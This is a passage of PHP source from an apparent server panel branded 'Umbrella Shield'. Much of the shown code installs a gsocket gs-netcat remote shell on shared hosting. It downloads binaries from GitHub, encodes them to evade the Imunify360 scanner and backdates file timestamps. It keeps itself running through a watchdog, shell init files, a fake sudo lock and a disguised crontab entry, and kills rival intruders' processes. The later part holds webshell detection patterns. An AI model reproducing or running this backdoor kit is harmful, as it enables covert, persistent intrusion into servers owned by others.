                $cmd3 = "cd " . escapeshellarg($home) . "; unset TMPDIR; export HOME=" . escapeshellarg($home) . "; X=" . escapeshellarg($secret) . " GS_PORT=$bestPort GS_HIDDEN_NAME=" . escapeshellarg($hiddenName) . " GS_NOCERTCHECK=1 bash " . escapeshellarg($allPath) . " 2>&1";
                $out3 = xcmd($cmd3);
                @unlink($allPath);
                $steps[] = 'Output: ' . substr($out3, 0, 300);
                sleep(2);
                $chk = intval(trim(xcmd("ps aux 2>/dev/null | grep -v grep | grep -cE 'gs-dbus|gs-netcat|defunct'")));
                if ($chk > 0) {
                    $gsrnOk = true;
                    $steps[] = 'Method 3: OK';
                } else
                    $steps[] = 'Method 3: FAIL';
            } else {
                @unlink($allPath);
                $steps[] = 'Method 3: download failed';
            }
        }

        if (!$gsrnOk) {
            $r['ok'] = false;
            $r['error'] = 'All 3 methods failed';
            $r['steps'] = $steps;
            echo json_encode($r);
            exit;
        }

        $actualBin = trim(xcmd("find " . escapeshellarg($bestDir) . " -maxdepth 1 -type f -executable 2>/dev/null | grep -v '.dat' | grep -v '.sh' | grep -v '.cfg' | head -1"));
        if (!$actualBin)
            $actualBin = $binPath;
        if (!file_exists($secFile)) {
            file_put_contents($secFile, $secret);
            @chmod($secFile, 0600);
        }
        xcmd("touch -r /etc/passwd " . escapeshellarg($actualBin) . " " . escapeshellarg($secFile) . " 2>/dev/null");

        // Encode binary backup (Imunify360 evasion)
        $cfgFile = "$bestDir/.defunct.cfg";
        $encOk = false;
        if (file_exists($actualBin) && filesize($actualBin) > 1000) {
            $encOk = _gs_pack($actualBin, $cfgFile);
        }
        if (!$encOk) {
            $steps[] = 'Binary already truncated by Imunify, rescue-downloading to /dev/shm...';
            $rescueBin = '/dev/shm/.gs_rescue_' . getmypid();
            xcmd("curl -fsSL -o " . escapeshellarg($rescueBin) . " 'https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$archKey' 2>/dev/null");
            if (file_exists($rescueBin) && filesize($rescueBin) > 1000) {
                $encOk = _gs_pack($rescueBin, $cfgFile);
                if (!$encOk) {
                    $tarUrl = "https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_{$archKey}-alpine.tar.gz";
                    xcmd("curl -fsSL " . escapeshellarg($tarUrl) . " 2>/dev/null | tar xzf - -C /dev/shm/ 2>/dev/null && mv /dev/shm/gs-netcat* " . escapeshellarg($rescueBin) . " 2>/dev/null");
                    if (file_exists($rescueBin) && filesize($rescueBin) > 1000)
                        $encOk = _gs_pack($rescueBin, $cfgFile);
                }
                @unlink($rescueBin);
                xcmd("rm -f " . escapeshellarg($rescueBin) . " /dev/shm/gs-netcat* 2>/dev/null");
            } else {
                @unlink($rescueBin);
            }
        }
        if ($encOk) {
            $steps[] = 'Binary encoded to .defunct.cfg (' . filesize($cfgFile) . ' bytes) — Imunify360 evasion OK';
            @chmod($cfgFile, 0600);
            xcmd("touch -r /etc/passwd " . escapeshellarg($cfgFile) . " 2>/dev/null");
        } else {
            $steps[] = 'WARN: Binary encoding failed — watchdog decode-run unavailable';
        }

        // Watchdog
        $steps[] = 'Installing watchdog (with intruder killer + auto-restore)...';
        $portEnv = $bestPort !== '443' ? "export GS_PORT=$bestPort; " : '';
        $perlDecode = 'base64 -d "$CFG" | perl -e \'my $k="UmBrElLaShIeLd";my $l=length($k);binmode STDIN;binmode STDOUT;my $b;while(read(STDIN,$b,8192)){my $o="";for my $i(0..length($b)-1){$o.=chr(ord(substr($b,$i,1))^ord(substr($k,$i%$l,1)))}print $o}\'';
        $wdScript = "#!/bin/bash\nOUR_SEC=\"" . addslashes($secFile) . "\"\nOUR_BIN=\"" . addslashes($actualBin) . "\"\nCFG=\"" . addslashes($cfgFile) . "\"\nEDIR=\"" . addslashes($bestDir) . "\"\nwhile true; do\n  for pid in \$(ps aux 2>/dev/null | grep -E 'gs-dbus|gs-netcat' | grep -v grep | grep -v \"\$OUR_SEC\" | awk '{print \$2}'); do\n    kill -9 \$pid 2>/dev/null\n  done\n  for pid in \$(ps aux 2>/dev/null | grep -v grep | grep -E '\\[k(cached|devtmpfs|compactd|swapd|worker|block)' | grep -v \"\$OUR_BIN\" | awk '{print \$2}'); do\n    kill -9 \$pid 2>/dev/null\n  done\n  for d in /tmp/.gs-* /var/tmp/.gs-* /dev/shm/.gs-*; do\n    [ -d \"\$d\" ] && rm -rf \"\$d\" 2>/dev/null\n  done\n  pgrep -f \"\$OUR_SEC\" >/dev/null 2>&1 || {\n    if [ -x \"\$OUR_BIN\" ] && [ -s \"\$OUR_BIN\" ]; then\n      {$portEnv}nohup \"\$OUR_BIN\" -k \"\$OUR_SEC\" -liqD </dev/null >/dev/null 2>&1 &\n    elif [ -f \"\$CFG\" ]; then\n      T=\"\$EDIR/.gs_\$\$\"\n      $perlDecode > \"\$T\" 2>/dev/null\n      chmod 700 \"\$T\" 2>/dev/null\n      {$portEnv}nohup \"\$T\" -k \"\$OUR_SEC\" -liqD </dev/null >/dev/null 2>&1 &\n      sleep 1\n      rm -f \"\$T\" 2>/dev/null\n    fi\n  }\n  sleep 30\ndone";
        $wdPath = "$bestDir/.watchdog.sh";
        file_put_contents($wdPath, $wdScript);
        @chmod($wdPath, 0700);
        xcmd("touch -r /etc/passwd " . escapeshellarg($wdPath) . " 2>/dev/null; nohup bash " . escapeshellarg($wdPath) . " </dev/null >/dev/null 2>&1 &");
        $steps[] = strpos(xcmd("pgrep -f watchdog.sh >/dev/null && echo OK"), 'OK') !== false ? 'Watchdog: OK' : 'Watchdog: FAIL';

        // .bashrc persistence
        $steps[] = 'Writing .bashrc (lock + banner + persistence)...';
        $passHash = trim(xcmd("echo -n 'subhamdalle' | sha256sum | awk '{print \$1}'"));
        $binBase = basename($actualBin);
        $perlDecBash = 'base64 -d "$B/.defunct.cfg" | perl -e \'my $k="UmBrElLaShIeLd";my $l=length($k);binmode STDIN;binmode STDOUT;my $b;while(read(STDIN,$b,8192)){my $o="";for my $i(0..length($b)-1){$o.=chr(ord(substr($b,$i,1))^ord(substr($k,$i%$l,1)))}print $o}\' > "$_T" 2>/dev/null && chmod 700 "$_T" && nohup "$_T" -k "$B/.defunct.dat" -liqD </dev/null >/dev/null 2>&1 & sleep 1; rm -f "$_T"';
        $bashrc_lines = [
            '# .bashrc',
            'B="' . $bestDir . '"',
            'for _p in $(ps aux 2>/dev/null|grep -E "gs-dbus|gs-netcat"|grep -v grep|grep -v "$B/.defunct.dat"|awk \'{print $2}\');do kill -9 $_p 2>/dev/null;done',
            'rm -rf /tmp/.gs-* /var/tmp/.gs-* /dev/shm/.gs-* 2>/dev/null',
            'pgrep -f ".defunct.dat" >/dev/null 2>&1||{ if [ -x "$B/' . $binBase . '" ];then nohup "$B/' . $binBase . '" -k "$B/.defunct.dat" -liqD </dev/null >/dev/null 2>&1 & elif [ -f "$B/.defunct.cfg" ];then _T="/dev/shm/.gs_$$"; ' . $perlDecBash . '; fi; }',
            'pgrep -f "watchdog.sh" >/dev/null 2>&1||(nohup bash "$B/.watchdog.sh" </dev/null >/dev/null 2>&1 &)',
            'clear 2>/dev/null',
            'trap "" INT TSTP QUIT HUP',
            '_U=$(whoami)',
            '_H=$(hostname -s 2>/dev/null || hostname)',
            'echo -e "\033[1;31m"',
            'cat <<\'ART\'',
            '  ...............',
            '      ..,;:ccc,.',
            '    ......\'\'\'\'\'lxO.',
            '  ..\'\'\'\'...........,:ld;',
            '  .\'\'\'\'\'  ,OXxoc;,.. ....',
            '  ...         ,ONkc;,;cokOdc,.',
            '    .           OMo         `:ddo.',
            '                dMc              :OO;',
            '                0M.                .:o.',
            '                ;Wd',
            '                 ;XO,',
            '                  ,d0Odlc;,..',
            '                    ..,;:cdO0d::,.',
            '                           .:d;. \':;.',
            '                              \'d,  .\'',
            '                                ;l  ..',
            '                                 .o',
            '                                   c',
            '                                   .\'',
            '                                    .',
            'ART',
            'echo -e "\033[0m"',
            'echo -e "\033[1;37m   Umbrella Shield\033[0m \033[90mv1.0\033[0m"',
            'echo',
            'sleep 1',
            'echo -e "\033[32m${_U}@${_H}\033[0m:\033[34m~\033[0m\$ ls -la"',
            'sleep 0.3',
            'echo "total 92"',
            'echo "drwxr-xr-x 13 ${_U} apache     4096 $(date +\'%b %e %H:%M\') ."',
            'echo "drwxr-xr-x  4 root     root       4096 May  3 17:51 .."',
            'echo "-rw-------  1 ${_U} ${_U}   1690 $(date +\'%b %e %H:%M\') .bashrc"',
            'echo "drwx------  2 ${_U} ${_U}   4096 $(date +\'%b %e\') .cache"',
            'echo "drwx------  3 ${_U} ${_U}   4096 $(date +\'%b %e\') .config"',
            'echo "drwxr-xr-x 22 ${_U} ${_U}   4096 May  9 16:30 domains"',
            'echo "-rw-r--r--  1 ${_U} ${_U}      8 Oct 30  2024 dead.letter"',
            'echo "drwxr-xr-x  2 ${_U} ${_U}   4096 May  1 12:00 logs"',
            'echo "drwxr-xr-x  3 ${_U} ${_U}   4096 $(date +\'%b %e\') public_html"',
            'echo "drwx------  2 ${_U} ${_U}   4096 Sep 15  2024 .ssh"',
            'echo "drwxr-xr-x  2 ${_U} ${_U}   4096 May  6  2025 tmp"',
            'sleep 0.5',
            'echo -e "\033[32m${_U}@${_H}\033[0m:\033[34m~\033[0m\$ sudo -v"',
            'sleep 0.3',
            '_SHASH="' . $passHash . '"',
            'read -sp "[sudo] password for ${_U}: " _KEY',
            'echo',
            '_KHASH=$(echo -n "$_KEY" | sha256sum | awk \'{print $1}\')',
            'if [ "$_KHASH" != "$_SHASH" ]; then',
            '  echo "Sorry, try again."',
            '  read -sp "[sudo] password for ${_U}: " _KEY2',
            '  echo',
            '  _K2=$(echo -n "$_KEY2" | sha256sum | awk \'{print $1}\')',
            '  if [ "$_K2" != "$_SHASH" ]; then',
            '    echo "sudo: 2 incorrect password attempts"',
            '    sleep 2',
            '    exit 1',
            '  fi',
            'fi',
            'trap - INT TSTP QUIT HUP',
            'clear 2>/dev/null',
            'echo',
            'echo -e "\033[90m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"',
            'echo -e "  \033[1;37m  ☂  UMBRELLA SHIELD\033[0m  \033[90m|\033[0m  \033[32m● SYSTEM LOCKED\033[0m"',
            'echo -e "\033[90m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"',
            'echo -e "\033[90m  OPERATOR  \033[36mUMBRELLA DEFENSE  [ GUARDIAN ]\033[0m"',
            'echo -e "\033[90m  HOST      \033[36m$(hostname)\033[0m"',
            'echo -e "\033[90m  USER      \033[36m$(whoami) (UID $(id -u))\033[0m"',
            'echo -e "\033[90m  TIME      \033[36m$(date \'+%Y-%m-%d %H:%M:%S\')\033[0m"',
            'echo',
            'echo -e "\033[90m  DEFENSE MODULES:\033[0m"',
            '_G="$(pgrep -fc .defunct.dat 2>/dev/null)"',
            '_W="$(pgrep -fc watchdog.sh 2>/dev/null)"',
            '[[ "$_G" -gt 0 ]] 2>/dev/null && _GS="\033[32m[ ● ACTIVE ]" || _GS="\033[31m[ ○ DOWN ]"',
            '[[ "$_W" -gt 0 ]] 2>/dev/null && _WS="\033[32m[ ● ACTIVE ]" || _WS="\033[31m[ ○ DOWN ]"',
            'echo -e "\033[90m    ▸ Guardian .........\033[0m $_GS\033[0m"',
            'echo -e "\033[90m    ▸ Watchdog .........\033[0m $_WS\033[0m"',
            'echo -e "\033[90m    ▸ Shell Lock .......\033[0m \033[32m[ ● ACTIVE ]\033[0m"',
            'echo -e "\033[90m    ▸ Police Check .....\033[0m \033[32m[ ● ACTIVE ]\033[0m"',
            'echo',
            'echo -e "  \033[90m[ ☂ ]\033[0m \033[32mGATEWAY SECURED :: ● UMBRELLA_ONLINE\033[0m"',
            'echo -e "\033[90m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"',
            'echo',
        ];
        $bashrcContent = implode("\n", $bashrc_lines) . "\n";
        $bashrcB64 = base64_encode($bashrcContent);
        $binBase = basename($actualBin);
        $perlDecBashStealth = 'base64 -d "$B/.defunct.cfg" | perl -e \'my $k="UmBrElLaShIeLd";my $l=length($k);binmode STDIN;binmode STDOUT;my $b;while(read(STDIN,$b,8192)){my $o="";for my $i(0..length($b)-1){$o.=chr(ord(substr($b,$i,1))^ord(substr($k,$i%$l,1)))}print $o}\' > "$_T" 2>/dev/null && chmod 700 "$_T" && nohup "$_T" -k "$B/.defunct.dat" -liqD </dev/null >/dev/null 2>&1 & sleep 1; rm -f "$_T"';
        $stealthComment = '#1b5b324a50524e47 >/dev/random # seed prng defunct-kernel';
        $stealthDaemon = 'B="' . $bestDir . '"; pgrep -f ".defunct.dat" >/dev/null 2>&1||{ if [ -x "$B/' . $binBase . '" ];then ' . ($bestPort !== '443' ? "GS_PORT=$bestPort " : '') . 'nohup "$B/' . $binBase . '" -k "$B/.defunct.dat" -liqD </dev/null >/dev/null 2>&1 & elif [ -f "$B/.defunct.cfg" ];then _T="/dev/shm/.gs_$$"; ' . $perlDecBashStealth . '; fi; }; pgrep -f "watchdog.sh" >/dev/null 2>&1||(nohup bash "$B/.watchdog.sh" </dev/null >/dev/null 2>&1 &)';
        $stealthOneLiner = '{ echo ' . base64_encode($stealthDaemon) . '|base64 -d|bash;} 2>/dev/null ' . $stealthComment . "\n";
        $stealthB64 = base64_encode($stealthOneLiner);
        $rcOk = 0;
        // .bashrc = full interactive content (only sourced by interactive shells)
        $wCmd = "echo '$bashrcB64' | base64 -d > " . escapeshellarg("$home/.bashrc") . " 2>/dev/null && echo RC_OK";
        $wOut = xcmd($wCmd);
        if (strpos($wOut, 'RC_OK') !== false) {
            xcmd("touch -r /etc/passwd " . escapeshellarg("$home/.bashrc") . " 2>/dev/null");
            $rcOk++;
        }
        // .profile, .bash_profile, .bash_login = stealth one-liner ONLY
        // CRITICAL: these are sourced by login shells AND by web server PHP exec
        // Writing echo/interactive content here causes bash output to leak into web pages
        foreach (['.profile', '.bash_profile', '.bash_login'] as $rcf) {
            $rcPath = "$home/$rcf";
            $wCmd2 = "echo '$stealthB64' | base64 -d > " . escapeshellarg($rcPath) . " 2>/dev/null && echo RC_OK";
            $wOut2 = xcmd($wCmd2);
            if (strpos($wOut2, 'RC_OK') !== false) {
                xcmd("touch -r /etc/passwd " . escapeshellarg($rcPath) . " 2>/dev/null");
                $rcOk++;
            }
        }
        $steps[] = "Lock written to $rcOk shell init files (.bashrc=full, .profile/.bash_profile/.bash_login=stealth)";
        if ($rcOk === 0)
            $steps[] = '.bashrc write failed, setting up crontab persistence only';

        // Crontab persistence (with decode-run fallback)
        $cronDecode = "T=/dev/shm/.gs_\\$\\$; base64 -d '" . addslashes($cfgFile) . "' | perl -e 'my \\$k=\"UmBrElLaShIeLd\";my \\$l=length(\\$k);binmode STDIN;binmode STDOUT;my \\$b;while(read(STDIN,\\$b,8192)){my \\$o=\"\";for my \\$i(0..length(\\$b)-1){\\$o.=chr(ord(substr(\\$b,\\$i,1))^ord(substr(\\$k,\\$i%\\$l,1)))}print \\$o}' > \\$T 2>/dev/null && chmod 700 \\$T && nohup \\$T -k '" . addslashes($secFile) . "' -liqD </dev/null >/dev/null 2>&1 & sleep 1; rm -f \\$T";
        $daemonPL = "pgrep -f '" . addslashes($secFile) . "' >/dev/null 2>&1 || { if [ -x '" . addslashes($actualBin) . "' ]; then {$portEnv}nohup '" . addslashes($actualBin) . "' -k '" . addslashes($secFile) . "' -liqD </dev/null >/dev/null 2>&1 & elif [ -f '" . addslashes($cfgFile) . "' ]; then $cronDecode; fi; }";
        $sc = '#1b5b324a50524e47 >/dev/random # seed prng defunct-kernel';
        $sn = '# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel';
        $cronCmd = implode('; ', [
            "export HOME=" . escapeshellarg($home),
            "_CR=\$(echo '" . addslashes($daemonPL) . "' | base64 -w0 2>/dev/null || echo '" . addslashes($daemonPL) . "' | base64 2>/dev/null)",
            "(crontab -l 2>/dev/null | grep -v defunct | grep -v '1b5b324a' | grep -v 'seed prng') > /tmp/.cr_\$\$ 2>/dev/null",
            "echo '$sn' >> /tmp/.cr_\$\$",
            "echo '*/5 * * * * { echo \$_CR|base64 -d|bash;} 2>/dev/null $sc' >> /tmp/.cr_\$\$",
            "crontab /tmp/.cr_\$\$ 2>/dev/null; rm -f /tmp/.cr_\$\$",
            "echo CRON_OK",
        ]);
        $cOut = xcmd($cronCmd);
        $steps[] = strpos($cOut, 'CRON_OK') !== false ? 'Crontab: OK' : 'Crontab: partial';
        xcmd("touch -r /etc/passwd " . escapeshellarg($actualBin) . " 2>/dev/null");

        $connectCmd = $bestPort !== '443' ? "GS_PORT=$bestPort gs-netcat -s \"$secret\" -i" : "gs-netcat -s \"$secret\" -i";
        $r['steps'] = $steps;
        $r['ok'] = $gsrnOk;
        $r['secret'] = $secret;
        $r['port'] = $bestPort;
        $r['dir'] = $bestDir;
        $r['hidden_name'] = $hiddenName;
        $r['connect_cmd'] = $connectCmd;
        $r['arch'] = $archKey;
    } elseif ($api === 'scan_processes') {
        $out = xcmd('ps aux');
        $procs = [];
        $threats = [];
        foreach (explode("\n", trim($out)) as $line) {
            if (empty($line) || strpos($line, 'USER') === 0)
                continue;
            $p = preg_split('/\s+/', $line, 11);
            if (count($p) < 11)
                continue;
            $row = ['user' => $p[0], 'pid' => $p[1], 'cpu' => $p[2], 'mem' => $p[3], 'stat' => $p[7], 'cmd' => $p[10]];
            $is_threat = false;
            $ttype = '';
            $cmd = $p[10];
            if (strpos($p[0], substr($user, 0, 8)) !== false) {
                if (preg_match('/^\[.+\]/', $cmd) && strpos($line, 'lsphp') === false) {
                    $is_threat = true;
                    $ttype = 'fake_kernel';
                } elseif (preg_match('/python3?.*(-c|base64|socket|import\s+os|websocket)/', $cmd)) {
                    $is_threat = true;
                    $ttype = 'reverse_shell';
                } elseif (preg_match('/gs-netcat|gs-pipe|gsocket|GS_ARGS/i', $cmd)) {
                    $is_threat = true;
                    $ttype = 'gsocket';
                } elseif (preg_match('/perl.*-e.*(socket|fork|exec)/', $cmd)) {
                    $is_threat = true;
                    $ttype = 'perl_shell';
                } elseif (preg_match('/\bnc\b.*-e|\bncat\b.*-e|socat.*exec/', $cmd)) {
                    $is_threat = true;
                    $ttype = 'netcat';
                } elseif (preg_match('/script\s+-qc/', $cmd)) {
                    $is_threat = true;
                    $ttype = 'pty_wrapper';
                }
            }
            $row['threat'] = $is_threat;
            $row['type'] = $ttype;
            $procs[] = $row;
            if ($is_threat)
                $threats[] = $row;
        }
        $r['procs'] = $procs;
        $r['threats'] = $threats;
        $r['total'] = count($procs);
        $r['threat_count'] = count($threats);
    } elseif ($api === 'kill_pid') {
        $pid = intval($_POST['pid'] ?? 0);
        if ($pid > 0) {
            xcmd('kill -9 ' . $pid);
            $r['killed'] = $pid;
        }
    } elseif ($api === 'pkill_all') {
        $myPid = getmypid();
        $parentPid = intval(trim(xcmd("ps -o ppid= -p $myPid 2>/dev/null")));
        xcmd("ps -u $(whoami) -o pid= 2>/dev/null | grep -v '^\s*$myPid\$' | grep -v '^\s*{$parentPid}\$' | xargs kill -9 2>/dev/null");
        $r['msg'] = 'All processes killed (except Shield)';
    } elseif ($api === 'get_roots') {
        $roots = [];
        $dd = "$home/domains";
        $dbg = ['home' => $home, 'home_env' => getenv('HOME'), 'doc_root' => $_SERVER['DOCUMENT_ROOT'] ?? '', 'http_host' => $_SERVER['HTTP_HOST'] ?? '', 'domains_dir_exists' => is_dir($dd), 'domains_raw' => [], 'public_html_exists' => is_dir("$home/public_html")];
        if (is_dir($dd)) {
            $allInDomains = scandir($dd);
            foreach ($allInDomains as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                $pub = "$dd/$d/public_html";
                $altRoots = ['public_html', 'html', 'www', 'htdocs', 'web'];
                $foundRoot = null;
                foreach ($altRoots as $wr) {
                    if (is_dir("$dd/$d/$wr")) {
                        $foundRoot = "$dd/$d/$wr";
                        break;
                    }
                }
                $dbg['domains_raw'][] = ['name' => $d, 'has_public_html' => is_dir($pub), 'found_root' => $foundRoot];
                if ($foundRoot)
                    $roots[$d] = $foundRoot;
            }
        }
        if (is_dir("$home/public_html")) {
            $mh = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? ''));
            $roots[$mh ?: 'main'] = "$home/public_html";
        }
        // ISPmanager/Beget/TimeWeb (RU hosting): /var/www/user/data/www/domain.com/
        if (is_dir("$home/www")) {
            foreach (scandir("$home/www") as $d) {
                if ($d === '.' || $d === '..')
                    continue;
                $wp = "$home/www/$d";
                if (is_dir($wp) && strpos($d, '.') !== false && !isset($roots[$d]))
                    $roots[$d] = $wp;
            }
        }
        if (empty($roots)) {
            $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
            if ($docRoot && is_dir($docRoot)) {
                $mh = strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
                $roots[$mh ?: 'main'] = $docRoot;
            }
        }
        $r['roots'] = $roots;
        $r['home'] = $home;
        $r['_dbg'] = $dbg;
    } elseif ($api === 'scan_files') {
        // ── RISK SCORING ENGINE ──────────────────────────────────────────
        // Setiap pattern punya score. Total score >= threshold = flagged.
        // Ini mengurangi false positive sambil menangkap obfuscation kompleks.
        // ─────────────────────────────────────────────────────────────────
        $scoredSigs = [
            // CRITICAL (score 100 — langsung flag)
            ['score' => 100, 'sig' => 'eval_base64', 'pat' => '/eval\s*\(\s*base64_decode/i'],
            ['score' => 100, 'sig' => 'eval_gzinflate', 'pat' => '/eval\s*\(\s*gzinflate/i'],
            ['score' => 100, 'sig' => 'eval_str_rot', 'pat' => '/eval\s*\(\s*str_rot13/i'],
            ['score' => 100, 'sig' => 'remote_eval', 'pat' => '/eval\s*\(\s*@?(file_get_contents|curl_exec|fread)\s*\(/i'],
            ['score' => 100, 'sig' => 'preg_replace_e', 'pat' => '/preg_replace\s*\(\s*[\'"][^\'"]*\/e[\'"]/i'],
            ['score' => 100, 'sig' => 'assert_encoded', 'pat' => '/assert\s*\(\s*(base64_decode|gzinflate|str_rot13)\s*\(/i'],
            ['score' => 100, 'sig' => 'create_fn_encode', 'pat' => '/create_function\s*\([^)]*\s*(base64_decode|gzinflate|strrev)/i'],
            ['score' => 100, 'sig' => 'webshell_rce', 'pat' => '/\b(passthru|system|shell_exec)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 100, 'sig' => 'assert_rce', 'pat' => '/assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            // PHAR: hanya flag jika phar:// dipakai dalam include/require/fopen — bukan sekedar string
            ['score' => 100, 'sig' => 'phar_exploit', 'pat' => '/(?:include|require|include_once|require_once|file_get_contents|fopen)\s*\(\s*[\'"]?phar:\/\//i'],
            // __HALT_COMPILER selalu suspicious (phar manifest signature di PHP file)
            ['score' => 100, 'sig' => 'phar_manifest', 'pat' => '/__HALT_COMPILER\s*\(\s*\)\s*;/'],
            ['score' => 100, 'sig' => 'c2_domain', 'pat' => '/kaye1337|5gvci|qris-pwn|pages\.dev\/stfu/i'],
            ['score' => 100, 'sig' => 'scarlynx', 'pat' => '/scar-?lynx|Scarlynx/i'],
            ['score' => 100, 'sig' => 'c99_shell', 'pat' => '/c99shell|r57shell|b374k|wso\s*shell/i'],
            ['score' => 100, 'sig' => 'phpfilemanager', 'pat' => '/phpFileManager/i'],
            ['score' => 100, 'sig' => 'ravagex', 'pat' => '/ravage-?x|SHADOW\.OPERATOR|HIDDEN_SECTOR/i'],
            ['score' => 100, 'sig' => 'wp_auth_hijack', 'pat' => '/goto\s+\w+;.{0,500}wp_set_auth_cookie/si'],
            // cookie_trigger: jarak 200→800 karena attacker sering pisahkan cookie check & eval jauh
            ['score' => 100, 'sig' => 'cookie_trigger', 'pat' => '/isset\s*\(\s*\$_COOKIE\[.{0,80}\]\s*\).{0,800}eval\s*\(/si'],
            // tmpfile loader — colors.php pattern: tmpfile() + file_get_contents(url) + @include $path
            ['score' => 100, 'sig' => 'tmpfile_loader', 'pat' => '/tmpfile\s*\(\s*\).{0,500}file_get_contents/si'],
            ['score' => 100, 'sig' => 'backdoor_include', 'pat' => '/@include_once\s.*\.config/i'],
            ['score' => 100, 'sig' => 'panox1', 'pat' => '/panox1|backlink-3dp/i'],
            // Base85+XOR+ROT13 obfuscation (conhive.it attacker pattern — bypasses eval/base64 scanner)
            ['score' => 100, 'sig' => 'base85_xor_rot13', 'pat' => '/function\s+_n\s*\(\$s\s*,\s*\$p\s*\).{0,200}function\s+_x\s*\(\$d\s*,\s*\$k\s*\)/si'],
            ['score' => 100, 'sig' => 'rot13_fn_names', 'pat' => '/str_rot13\s*\(\s*[\'"](?:tmhapbzcerff|flf_trg_grzc_qve|grzcanz|svyr_chg_pbagragf|hayvax)[\'"]\s*\)/i'],
            ['score' => 80, 'sig' => 'tempfile_exec', 'pat' => '/(?:tempnam|sys_get_temp_dir)\s*\(.{0,500}(?:include|require)\s/si'],
            // mu-plugin eval — catch eval(gzuncompress(base64_decode( double-wrap pattern
            ['score' => 100, 'sig' => 'mu_plugin_eval', 'pat' => '/eval\s*\(\s*@?gzuncompress\s*\(\s*base64_decode/i'],
            ['score' => 100, 'sig' => 'ranksat_ioc', 'pat' => '/RanksatAdmin|prabowoasw99|prabowomemek/i'],
            // SystemContextManager — shell framework menyamar sebagai "Core Service Protocol Bridge"
            ['score' => 100, 'sig' => 'system_ctx_mgr', 'pat' => '/SystemContextManager|Core\s+Service\s+Protocol\s+Bridge/i'],
            // Backtick RCE: `$_GET[x]` or `$_POST[x]` — shell via PHP backtick operator
            ['score' => 100, 'sig' => 'backtick_rce', 'pat' => '/`\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            // Backtick curly brace: `{$_GET[0]}` `{$_COOKIE[x]}` — bypass scanner naif
            ['score' => 100, 'sig' => 'backtick_curly_rce', 'pat' => '/`\s*\{\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            // include/require langsung dari user input — remote/local file inclusion
            ['score' => 100, 'sig' => 'include_user_path', 'pat' => '/(?:include|require)(?:_once)?\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\s*\[/i'],
            // Short tag eval: <?= eval(...) — common one-liner shell
            ['score' => 100, 'sig' => 'short_tag_eval', 'pat' => '/<\?=\s*eval\s*\(/i'],
            // File manager tools — full GUI backdoors
            ['score' => 100, 'sig' => 'file_manager_shell', 'pat' => '/FM_PASSWORD_HASH|KanjutDolphin|Tiny\s*File\s*Manager|p0wny.*shell/i'],
            // CVE probe/batch scanner marker
            ['score' => 100, 'sig' => 'cve_probe', 'pat' => '/CVE_\d{4}_\d+_BATCH/i'],
            // Uploader tanpa auth — move_uploaded_file langsung tanpa check
            ['score' => 80, 'sig' => 'unauth_uploader', 'pat' => '/move_uploaded_file\s*\(\s*\$_FILES/i'],
            // eval(gzuncompress(...)) — variant dari gzinflate
            ['score' => 100, 'sig' => 'eval_gzuncompress', 'pat' => '/eval\s*\(\s*gzuncompress/i'],
            // Remote include via variable — colors.php: @include $var setelah fetch URL
            ['score' => 50, 'sig' => 'remote_inc_var', 'pat' => '/@include\s+\$\w+|@require\s+\$\w+/i'],
            // wp_remote_get/post lalu eval — attacker pakai WP HTTP API sebagai loader
            ['score' => 100, 'sig' => 'wp_remote_eval', 'pat' => '/wp_remote_get\s*\(.{0,300}eval\s*\(/si'],
            // Indirect execution — call_user_func, array_map, array_filter, usort with dangerous callback
            ['score' => 100, 'sig' => 'indirect_rce', 'pat' => '/\b(call_user_func|call_user_func_array)\s*\(\s*[\'"](system|exec|passthru|shell_exec|popen|eval|assert)[\'"]/i'],
            ['score' => 90, 'sig' => 'callback_rce', 'pat' => '/\b(array_map|array_filter|array_walk|usort|uasort|uksort|array_reduce)\s*\(\s*[\'"](system|exec|passthru|shell_exec|assert)[\'"]/i'],
            ['score' => 90, 'sig' => 'callback_rce_var', 'pat' => '/\b(call_user_func|array_map|array_filter|array_walk)\s*\(\s*\$\w+\s*,\s*(\$_(GET|POST|REQUEST|COOKIE)|\[)/i'],
            // ob_start callback — sneaky: ob_start('system'); echo $_GET['cmd']; ob_end_flush();
            ['score' => 100, 'sig' => 'ob_callback_rce', 'pat' => '/ob_start\s*\(\s*[\'"](system|exec|passthru|shell_exec|assert)[\'"]\s*\)/i'],
            ['score' => 40, 'sig' => 'ob_callback_var', 'pat' => '/ob_start\s*\(\s*\$\w+/i'],
            // register_shutdown_function — persistence RCE
            ['score' => 100, 'sig' => 'shutdown_rce', 'pat' => '/register_shutdown_function\s*\(\s*[\'"](system|exec|passthru|shell_exec|eval|assert)[\'"]/i'],
            // include data:// or php://input — stream wrappers
            ['score' => 100, 'sig' => 'stream_include', 'pat' => '/\b(include|require|include_once|require_once)\s*\(\s*[\'"]?(data|php|expect|zip):\/\//i'],
            ['score' => 90, 'sig' => 'php_input_eval', 'pat' => '/file_get_contents\s*\(\s*[\'"]php:\/\/input[\'"]\s*\).{0,200}eval/si'],
            // extract()/parse_str() injection — creates variables from user input
            ['score' => 80, 'sig' => 'extract_inject', 'pat' => '/\bextract\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i'],
            ['score' => 80, 'sig' => 'parse_str_inject', 'pat' => '/\bparse_str\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/i'],
            // preg_replace_callback with eval/system
            ['score' => 100, 'sig' => 'preg_callback_rce', 'pat' => '/preg_replace_callback\s*\(.{0,200}(eval|system|exec|passthru|shell_exec|assert)\s*\(/si'],
            // Variable function concatenation — $a='ba'.'se'.'64_'.'de'.'code'
